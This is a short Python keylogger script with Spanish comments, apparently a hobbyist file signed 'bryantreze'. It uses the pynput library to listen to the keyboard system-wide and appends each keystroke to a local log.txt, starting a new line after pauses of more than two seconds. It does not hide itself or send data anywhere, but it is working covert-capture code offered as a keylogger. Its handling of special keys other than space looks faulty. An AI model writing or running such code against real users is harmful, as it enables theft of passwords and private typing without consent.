from pynput.keyboard import Key, Listener
import time

#python 3.9
#bryantreze
#keylogger detecta todas las teclas
# Función para manejar la presión de teclas
def on_press(key):
    global last_key_time
    current_time = time.time()

    # Verificar si el tiempo transcurrido es mayor a 2 segundos
    if current_time - last_key_time > 2:
        with open("log.txt", "a") as logfile:
            logfile.write("\n")  # Insertar una nueva línea si han pasado más de 2 segundos

    with open("log.txt", "a") as logfile:
        # Verificar si la tecla presionada es un espacio
        if key == Key.space:
            logfile.write(" ")  # Insertar un espacio si la tecla es un espacio
        else:
            logfile.write(f"{key.char}")  # Escribir el carácter de la tecla presionada
    last_key_time = current_time  # Actualizar el tiempo de la última tecla presionada

last_key_time = time.time()  # Inicializar el tiempo de la última tecla presionada

# Configurar y comenzar el listener
with Listener(on_press=on_press) as listener:
    listener.join()
